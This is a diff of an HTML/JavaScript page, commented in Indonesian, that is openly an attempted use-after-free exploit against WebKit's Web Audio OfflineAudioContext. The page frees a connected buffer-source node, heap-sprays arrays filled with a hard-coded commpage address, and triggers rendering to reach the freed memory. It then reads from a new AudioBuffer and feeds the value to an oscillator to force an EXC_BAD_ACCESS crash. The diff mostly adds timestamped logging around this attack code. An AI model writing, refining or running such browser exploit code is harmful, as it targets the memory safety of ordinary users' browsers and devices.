@@ -1,14 +1,31 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>OfflineAudioContext UAF (Synchronous Attack)</title>
+    <title>OfflineAudioContext UAF (Synchronous Attack) - Log Penuh</title>
+    <style>
+        #log-area {
+            border: 1px solid #ccc;
+            padding: 10px;
+            margin-top: 15px;
+            max-height: 400px;
+            overflow-y: scroll;
+            font-family: monospace;
+            font-size: 12px;
+            background-color: #f9f9f9;
+        }
+        .log-init { color: blue; }
+        .log-info { color: black; }
+        .log-spray { color: purple; }
+        .log-critical { color: red; font-weight: bold; }
+        .log-success { color: green; font-weight: bold; }
+    </style>
 </head>
 <body>
 
     <h1>OfflineAudioContext UAF (Sinkron Agresif)</h1>
     <p>Target Commpage Address: 0x0000000FFFFFC320</p>
-    <p id="status">INIT: Mempersiapkan Audio Context Sinkron...</p>
-    <div id="log"></div>
+    <p id="status" class="log-init">INIT: Mempersiapkan Audio Context Sinkron...</p>
+    <div id="log-area"></div>
 
     <script>
         // --- KONSTANTA COMM PAGE ---
@@ -19,17 +36,23 @@
         const LOW_WORD = Number(TARGET_CONTROL_ADDRESS & 0xFFFFFFFFn); 
         const HIGH_WORD = Number(TARGET_CONTROL_ADDRESS >> 32n);
 
+        let startTime = performance.now();
         let offlineCtx = null;
         let victimNode = null;
         let payloadHolders = []; 
 
-        function log(message) {
-            document.getElementById('log').innerHTML += `<div style="margin: 2px 0;">${message}</div>`;
+        // --- FUNGSI LOGGING DENGAN TIMESTAMP ---
+        function log(message, type = 'log-info') {
+            const timeElapsed = (performance.now() - startTime).toFixed(2);
+            const logElement = document.getElementById('log-area');
+            logElement.innerHTML += `<div class="${type}">[${timeElapsed}ms] ${message}</div>`;
+            logElement.scrollTop = logElement.scrollHeight;
         }
         
         // --- FUNGSI HEAP SPRAY PAYLOAD ---
         function sprayPayload() {
-            const SPRAY_COUNT = 1500; // Peningkatan agresivitas spray
+            log("Memulai Spraying Payload...", "log-spray");
+            const SPRAY_COUNT = 1500;
             const PAYLOAD_SIZE = 64; 
 
             for (let i = 0; i < SPRAY_COUNT; i++) {
@@ -39,63 +62,13 @@
                 payloadArray[2] = 2028.0 + i; 
                 payloadHolders.push(payloadArray); 
             }
+            log(`Spray selesai. ${SPRAY_COUNT} Array dialokasikan.`, "log-spray");
         }
 
-        // --- FUNGSI UTAMA ATTACK ---
-        function runOfflineAttack() {
-            log("Phase 1: Membuat OfflineAudioContext.");
-            
-            // 1. Inisialisasi Offline Context (Sinkron)
-            try {
-                // Buat context kecil, cepat selesai
-                offlineCtx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100 * 1, 44100); 
-            } catch(e) {
-                log("ERROR: OfflineAudioContext tidak didukung.");
-                return;
-            }
-
-            // 2. Alokasi Korban (Victim Node)
-            let buffer = offlineCtx.createBuffer(1, 44100, 44100);
-            victimNode = offlineCtx.createBufferSource();
-            victimNode.buffer = buffer;
-            victimNode.connect(offlineCtx.destination);
-            victimNode.start(0);
-
-            log("Phase 2: Node Korban dibuat dan terhubung.");
-
-            // 3. FREE DAN SPRAY SINKRON AGRESIIF
-            // Ini adalah bagian paling sensitif. Kita lakukan FREE dan SPRAY tanpa setTimeout.
-            
-            // FREE: Putuskan koneksi (memungkinkan C++ me-free node)
-            victimNode.disconnect(); 
-            // Hapus referensi JS
-            victimNode = null; 
-            buffer = null;
-
-            log("Phase 3: FREE Node Korban (Pointer Dangling).");
-            
-            // SPRAY: Tepat setelah FREE (Hampir sinkron)
-            sprayPayload(); 
-            log("Phase 4: Heap Spray Commpage Payload.");
-
-            // 4. Memicu Trigger Cleanup/Dereference
-            log("Phase 5: Memulai Render Sinkron...");
-            
-            // Panggil render. Ini akan memaksa WebKit membersihkan dan menggunakan objek di Audio Thread.
-            offlineCtx.startRendering().then(() => {
-                // Jika tidak crash di render, coba trigger dereference JS pasca render
-                log("Render Selesai. Memicu Trigger Alternatif...");
-                triggerAlternativeCrash();
-            }).catch(e => {
-                // Jika error, seringkali ini adalah tanda UAF/Corruption
-                log("Render GAGAL (Sinyal UAF/Corrupt): " + e.message);
-                triggerAlternativeCrash();
-            });
-
-        }
-        
-        // Trigger Alternatif (Mirip UAF/Dereference sebelumnya)
+        // --- Trigger Alternatif (Dipanggil jika Render selesai tanpa crash) ---
         function triggerAlternativeCrash() {
+             log("Memicu Trigger Alternatif...", "log-critical");
+             
              // 1. Coba alokasi objek Web Audio yang sama
              let attackerCtx = new (window.AudioContext || window.webkitAudioContext)();
              let attackerBuffer = attackerCtx.createBuffer(1, 44100, 44100); 
@@ -105,14 +78,68 @@
                  // 2. Akses memori di alamat awal buffer yang sekarang mungkin berisi pointer rusak
                  let crashPtr = attackerView[0]; 
                  
+                 log(`Membaca memori: 0x${crashPtr.toString(16)}`, "log-critical");
+
+                 if (crashPtr.toFixed(0) === LOW_WORD.toString()) {
+                     log("SUCCESS: Alamat Commpage Ditemukan di Pointer AudioBuffer!", "log-success");
+                 }
+                 
                  // 3. FORCE CRASH: Gunakan nilai pointer yang didapat
                  let crashNode = attackerCtx.createOscillator();
-                 // Menggunakan Commpage Address sebagai frekuensi yang tidak valid
                  crashNode.frequency.value = crashPtr; 
 
              } catch(e) {
-                 log("JS Error/Guard: " + e.message + " - Menunggu Crash OS (EXC_BAD_ACCESS).");
+                 log(`JS Exception Terdeteksi: ${e.message}`, "log-critical");
+                 document.getElementById('status').className = 'log-critical';
+                 document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Menunggu Crash OS (EXC_BAD_ACCESS).';
              }
+        }
+
+        // --- FUNGSI UTAMA ATTACK ---
+        function runOfflineAttack() {
+            startTime = performance.now();
+            log("Phase 1: Membuat OfflineAudioContext.", "log-init");
+            
+            try {
+                offlineCtx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100 * 1, 44100); 
+            } catch(e) {
+                log(`ERROR: OfflineAudioContext gagal: ${e.message}`, "log-critical");
+                return;
+            }
+
+            // 2. Alokasi Korban
+            let buffer = offlineCtx.createBuffer(1, 44100, 44100);
+            victimNode = offlineCtx.createBufferSource();
+            victimNode.buffer = buffer;
+            victimNode.connect(offlineCtx.destination);
+            victimNode.start(0);
+
+            log("Phase 2: Node Korban dibuat dan terhubung.", "log-info");
+
+            // 3. FREE DAN SPRAY SINKRON AGRESIIF
+            log("Phase 3: Memicu FREE dan SPRAY SINKRON...", "log-critical");
+            
+            // FREE:
+            victimNode.disconnect(); 
+            victimNode = null; 
+            buffer = null;
+            log("Node dan Buffer Referensi Dihapus.", "log-info");
+            
+            // SPRAY: Tepat setelah FREE (Hampir sinkron)
+            sprayPayload(); 
+            
+            // 4. Memicu Trigger Cleanup/Dereference
+            log("Phase 5: Memulai Render Sinkron...", "log-info");
+            
+            // Panggil render. Ini adalah titik trigger utama.
+            offlineCtx.startRendering().then(() => {
+                log("Render Selesai. Tidak ada crash di Audio Thread.", "log-info");
+                triggerAlternativeCrash();
+            }).catch(e => {
+                log(`Render GAGAL (Potensi UAF/Corrupt): ${e.message}`, "log-critical");
+                triggerAlternativeCrash();
+            });
+
         }
         
         document.addEventListener('DOMContentLoaded', () => {
